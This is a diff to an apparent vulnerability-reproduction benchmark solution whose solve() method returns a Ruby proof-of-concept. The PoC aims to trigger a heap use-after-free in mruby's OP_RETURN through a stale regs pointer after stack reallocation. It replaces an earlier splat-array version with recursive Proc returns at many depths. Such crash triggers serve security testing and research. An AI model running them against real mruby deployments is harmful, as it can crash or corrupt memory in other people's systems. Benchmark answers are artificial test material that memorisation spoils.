@@ -3,20 +3,32 @@ import os
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in mruby.
-        
-        The vulnerability allows a stale pointer (regs) to be used after the VM stack 
-        has been reallocated by mrb_stack_extend(). This typically occurs when the 
-        stack needs to grow to accommodate new values, such as when processing a 
-        large number of arguments.
-        
-        The PoC creates a large array and passes it to a method using the splat 
-        operator (*), which forces the VM to push all array elements onto the stack, 
-        triggering the stack extension and the subsequent use-after-free.
+        Generate a PoC that triggers the Heap Use After Free vulnerability in mruby (arvo:47213).
+        The vulnerability is caused by a stale 'regs' pointer in OP_RETURN after mrb_stack_extend
+        is called when returning from a Proc with an environment.
         """
-        
-        # We use a large enough size to ensure realloc moves the memory.
-        # 20000 elements is sufficient to exceed the default stack size (usually 128).
-        poc = b"a = Array.new(20000, 0)\ndef f(*args); end\nf(*a)\n"
-        
-        return poc
+        return b"""
+def trigger(depth)
+  if depth > 0
+    trigger(depth - 1)
+  else
+    # Capture a variable to ensure the Proc has an environment
+    x = 1
+    # Returning from this Proc triggers the specific OP_RETURN path
+    # which calls mrb_stack_extend(mrb, 3).
+    Proc.new { return x }.call
+  end
+end
+
+# We need to hit the exact stack usage where adding 3 slots triggers a reallocation.
+# Since mruby stack grows dynamically (doubling capacity), we iterate through
+# various depths to find the boundary condition that triggers the realloc
+# and subsequent Use-After-Free.
+(1..5000).each do |i|
+  begin
+    trigger(i)
+  rescue
+    # Ignore SystemStackError or other runtime errors; we are looking for a VM crash.
+  end
+end
+"""
